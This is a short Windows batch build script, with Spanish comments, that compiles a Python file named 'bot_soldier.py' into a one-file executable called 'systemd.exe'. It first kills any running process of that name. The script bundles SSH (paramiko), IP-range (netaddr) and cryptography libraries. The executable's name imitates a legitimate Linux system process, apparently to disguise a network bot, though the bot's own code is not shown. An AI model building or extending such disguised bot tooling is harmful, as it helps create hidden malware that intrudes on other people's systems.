@echo off
cls
echo ========================================
echo   COMPILACION CON CONSOLA - DEBUG
echo ========================================
echo.

echo [*] Esta version MUESTRA la consola para debugging
echo.

taskkill /F /IM systemd.exe 2>nul
timeout /t 1 /nobreak >nul

if exist build rmdir /S /Q build 2>nul
if exist dist rmdir /S /Q dist 2>nul
del /F /Q *.spec 2>nul

echo [*] Compilando con consola visible...
python -m PyInstaller ^
    --onefile ^
    --console ^
    --name systemd ^
    --clean ^
    --hidden-import=paramiko ^
    --hidden-import=netaddr ^
    --hidden-import=cryptography ^
    bot_soldier.py

if %ERRORLEVEL% EQU 0 (
    echo.
    echo [+] Compilacion exitosa!
    echo [+] Ejecutable: dist\systemd.exe
    echo.
    echo [*] Ahora prueba: test_binary.bat
) else (
    echo [!] Error en compilacion
)

pause
